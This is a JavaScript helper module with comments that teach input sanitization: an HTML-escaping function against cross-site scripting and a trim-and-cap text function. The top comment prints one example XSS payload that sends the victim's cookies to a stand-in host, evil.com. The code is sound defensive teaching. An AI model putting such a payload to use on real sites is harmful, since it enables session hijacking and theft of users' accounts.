// ─── What is sanitization and why does it matter? ────────────────────────────
//
// When users submit a form, they control exactly what text gets sent to your
// server. A malicious user could type:
//
//   <script>document.location='https://evil.com?c='+document.cookie</script>
//
// If your server takes that string and drops it directly into an HTML email,
// the email client may execute it. This is called Cross-Site Scripting (XSS).
//
// The fix is to "escape" the dangerous characters before they touch HTML.
// Escaping replaces them with safe HTML entity equivalents:
//   <  →  &lt;   (less-than)
//   >  →  &gt;   (greater-than)
//   &  →  &amp;  (ampersand)
//   "  →  &quot; (double quote)
//   '  →  &#x27; (single quote)
//
// After escaping, the browser/email client renders them as literal text
// instead of interpreting them as HTML tags.
//
// Rule of thumb:
//   → escapeHtml()    before any user input goes INTO an HTML string
//   → sanitizeText()  before any user input goes INTO the database
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Escapes HTML special characters to prevent XSS in email HTML bodies.
 * Call this on every user-supplied value you interpolate into an HTML string.
 *
 * Example:
 *   escapeHtml('<script>alert(1)</script>')
 *   // → '&lt;script&gt;alert(1)&lt;/script&gt;'
 */
export function escapeHtml(str) {
  return String(str ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

/**
 * Trims whitespace and caps the length before storing in the database.
 * Prevents someone from storing 50MB of text in a single field.
 *
 * Example:
 *   sanitizeText('  hello  ', 5)
 *   // → 'hello'  (trimmed + capped at 5 chars)
 */
export function sanitizeText(str, maxLen = 1000) {
  return String(str ?? "").trim().slice(0, maxLen);
}
